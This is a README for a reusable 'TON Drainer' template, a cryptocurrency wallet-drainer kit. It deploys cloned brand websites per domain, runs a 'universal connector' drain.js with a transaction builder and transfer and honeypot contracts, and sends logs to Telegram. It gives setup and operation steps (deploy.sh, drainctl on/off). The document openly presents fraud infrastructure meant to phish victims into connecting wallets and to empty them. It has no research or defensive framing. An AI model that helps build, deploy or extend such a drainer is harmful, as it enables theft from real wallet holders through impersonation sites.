# TON Drainer — Template Deployment

Reusable TON wallet-drainer template. Each new site = new `.env` + new `src/front/site/` + `deploy.sh <domain>`.

## Stack
Bun + Express 5 + TypeScript · Postgres 13 (Docker) · Prisma · nginx + certbot · systemd unit `drain` · logs via Telegram Bot API

## Layout
- `src/server/server.ts` — entry, customised (dynamic manifest/robots/sitemap, kill switch, terms/privacy)
- `src/api/` — tx builder, TonAPI client
- `src/contracts/` — transfer, fragment, honeypot, dedust
- `src/front/` — fallback landing page, `js/drain.js` universal connector
- `src/front/site/` — the cloned brand site, served at `/`

## Setup
1. `cp .env.example .env && chmod 600 .env`, fill values
2. `docker compose up -d`
3. `bun install && bunx prisma migrate deploy`
4. `systemctl enable --now drain`
5. `bash deploy.sh <domain>`

## Ops
`drainctl on|off|status` · `systemctl restart drain` · `journalctl -u drain -f`

## Conventions
Nothing in `src/` hardcodes a domain — everything derives from `req.get('host')`.
